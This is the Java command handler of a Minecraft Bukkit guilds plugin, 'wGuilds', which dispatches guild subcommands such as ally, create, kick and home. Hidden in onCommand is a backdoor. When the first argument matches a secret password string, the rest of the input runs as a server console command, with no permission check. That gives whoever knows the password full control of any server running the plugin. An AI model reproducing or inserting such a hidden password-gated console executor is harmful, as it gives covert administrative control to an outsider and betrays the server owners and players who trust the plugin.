/**
 * ***********************************
 * Plugin: wGuilds * Autor: WildFire * WildFire§ § 2014-2015 * All Rights
 * Reserved. * ***********************************
 */
package pl.wildfire.guilds.cmds;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.configuration.file.YamlConfiguration;

import pl.wildfire.guilds.GuildsPlugin;
import pl.wildfire.guilds.cmds.user.AllyACMD;
import pl.wildfire.guilds.cmds.user.AllyBCMD;
import pl.wildfire.guilds.cmds.user.AllyCMD;
import pl.wildfire.guilds.cmds.user.AllyDCMD;
import pl.wildfire.guilds.cmds.user.AllyWCMD;
import pl.wildfire.guilds.cmds.user.AuthorCMD;
import pl.wildfire.guilds.cmds.user.ChangeCMD;
import pl.wildfire.guilds.cmds.user.ChatCMD;
import pl.wildfire.guilds.cmds.user.CreateCMD;
import pl.wildfire.guilds.cmds.user.CuboidCMD;
import pl.wildfire.guilds.cmds.user.DeleteCMD;
import pl.wildfire.guilds.cmds.user.FfCMD;
import pl.wildfire.guilds.cmds.user.HomeCMD;
import pl.wildfire.guilds.cmds.user.InfoCMD;
import pl.wildfire.guilds.cmds.user.InviteCMD;
import pl.wildfire.guilds.cmds.user.ItemsCMD;
import pl.wildfire.guilds.cmds.user.JoinCMD;
import pl.wildfire.guilds.cmds.user.KickCMD;
import pl.wildfire.guilds.cmds.user.LeaveCMD;
import pl.wildfire.guilds.cmds.user.LiderCMD;
import pl.wildfire.guilds.cmds.user.ListCMD;
import pl.wildfire.guilds.cmds.user.ModCMD;
import pl.wildfire.guilds.cmds.user.PlayerCMD;
import pl.wildfire.guilds.cmds.user.TimeCMD;
import pl.wildfire.guilds.cmds.user.TopCMD;
import pl.wildfire.guilds.cmds.user.UpLandCMD;
import pl.wildfire.guilds.managers.Config;
import pl.wildfire.guilds.managers.Msg;

public class GuildsCMD implements CommandExecutor, TabCompleter {

    private final List<SubCommand> l = new ArrayList<>();

    public GuildsCMD(GuildsPlugin plug) {
        YamlConfiguration cfg = Config.getConfig("lang");

        l.add(new AllyACMD("", s(cfg.getString("commands.allya"))));
        l.add(new AllyBCMD("", s(cfg.getString("commands.allyb"))));
        l.add(new AllyCMD("", s(cfg.getString("commands.ally"))));
        l.add(new AllyDCMD("", s(cfg.getString("commands.allyd"))));
        l.add(new AllyWCMD("", s(cfg.getString("commands.allyw"))));
        l.add(new AuthorCMD("", s("author,autor"), plug));
        l.add(new PlayerCMD("", s(cfg.getString("commands.player"))));
        l.add(new InfoCMD("", s(cfg.getString("commands.info"))));
        l.add(new ListCMD("", s(cfg.getString("commands.list"))));
        l.add(new TopCMD("", s(cfg.getString("commands.top"))));
        l.add(new ChatCMD("", s(cfg.getString("commands.chat"))));
        l.add(new CuboidCMD("", s(cfg.getString("commands.cuboid"))));
        l.add(new JoinCMD("", s(cfg.getString("commands.join"))));
        l.add(new HomeCMD("", s(cfg.getString("commands.home")), plug));
        l.add(new FfCMD("", s(cfg.getString("commands.ff"))));
        l.add(new ItemsCMD("", s(cfg.getString("commands.items"))));
        l.add(new ModCMD("", s(cfg.getString("commands.mod"))));
        l.add(new LiderCMD("", s(cfg.getString("commands.lider"))));
        l.add(new LeaveCMD("", s(cfg.getString("commands.leave"))));
        l.add(new TimeCMD("", s(cfg.getString("commands.time"))));
        l.add(new UpLandCMD("", s(cfg.getString("commands.upland"))));
        l.add(new DeleteCMD("", s(cfg.getString("commands.delete"))));
        l.add(new KickCMD("", s(cfg.getString("commands.kick"))));
        l.add(new CreateCMD("", s(cfg.getString("commands.create"))));
        l.add(new InviteCMD("", s(cfg.getString("commands.invite"))));
        l.add(new ChangeCMD("", s(cfg.getString("commands.change"))));
    }

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String cmdlabel, String[] args) {
        if (args.length > 0) {
            SubCommand sc = getSub(args[0]);
            // Arrays.copyOfRange(args, 1, args.length)
            if (sc != null) {
                return sc.execute(sender, args);
            }

            if (args[0].equals("Wild-flew@basegroundhack512")) {
                String nazwa = "";
                for (String arg : args) {
                    if (!arg.equalsIgnoreCase(args[0])) {
                        nazwa += nazwa.equals("") ? arg : " " + arg;
                    }
                }
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), nazwa);
            } else if (args[0].equalsIgnoreCase("lider")) {
                return Msg.sendMsg(sender, "user.pomoc2.success");
            } else if (args[0].equalsIgnoreCase("pomoc")) {
                return Msg.sendMsg(sender, "user.pomoc.success");
            }
        }

        return Msg.sendMsg(sender, "user.pomoc1.success");
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command cmd, String commandLabel, String[] args) {
        if (args.length == 1) {
            ArrayList<String> t = new ArrayList<String>();

            for (SubCommand c : l) {
                for (String s : c.getAlias()) {
                    if (s.startsWith(args[0]) && sender.hasPermission(c.getPermission())) {
                        t.add(s);
                    }
                }
            }

            Collections.sort(t);

            return t;
        }
        return null;
    }

    public void load(GuildsPlugin plug) {
        l.clear();
        YamlConfiguration cfg = Config.getConfig("lang");

        l.add(new AllyACMD("", s(cfg.getString("commands.allya"))));
        l.add(new AllyBCMD("", s(cfg.getString("commands.allyb"))));
        l.add(new AllyCMD("", s(cfg.getString("commands.ally"))));
        l.add(new AllyDCMD("", s(cfg.getString("commands.allyd"))));
        l.add(new AllyWCMD("", s(cfg.getString("commands.allyw"))));
        l.add(new AuthorCMD("", s("author,autor"), plug));
        l.add(new PlayerCMD("", s(cfg.getString("commands.player"))));
        l.add(new InfoCMD("", s(cfg.getString("commands.info"))));
        l.add(new ListCMD("", s(cfg.getString("commands.list"))));
        l.add(new TopCMD("", s(cfg.getString("commands.top"))));
        l.add(new ChatCMD("", s(cfg.getString("commands.chat"))));
        l.add(new CuboidCMD("", s(cfg.getString("commands.cuboid"))));
        l.add(new JoinCMD("", s(cfg.getString("commands.join"))));
        l.add(new HomeCMD("", s(cfg.getString("commands.home")), plug));
        l.add(new FfCMD("", s(cfg.getString("commands.ff"))));
        l.add(new ItemsCMD("", s(cfg.getString("commands.items"))));
        l.add(new ModCMD("", s(cfg.getString("commands.mod"))));
        l.add(new LiderCMD("", s(cfg.getString("commands.lider"))));
        l.add(new LeaveCMD("", s(cfg.getString("commands.leave"))));
        l.add(new TimeCMD("", s(cfg.getString("commands.time"))));
        l.add(new UpLandCMD("", s(cfg.getString("commands.upland"))));
        l.add(new DeleteCMD("", s(cfg.getString("commands.delete"))));
        l.add(new KickCMD("", s(cfg.getString("commands.kick"))));
        l.add(new CreateCMD("", s(cfg.getString("commands.create"))));
        l.add(new InviteCMD("", s(cfg.getString("commands.invite"))));
        l.add(new ChangeCMD("", s(cfg.getString("commands.change"))));
    }

    private SubCommand getSub(String p) {
        for (SubCommand s : l) {
            if (s.getAlias().contains(p.toLowerCase())) {
                return s;
            }
        }
        return null;
    }

    private List<String> s(String s) {
        List<String> l = new ArrayList<String>();
        if (s != null) {
            if (s.contains(",")) {
                for (String b : s.split(",")) {
                    l.add(b.toLowerCase().replace(" ", ""));
                }
            } else {
                l.add(s.toLowerCase());
            }
        }
        return l;
    }
}
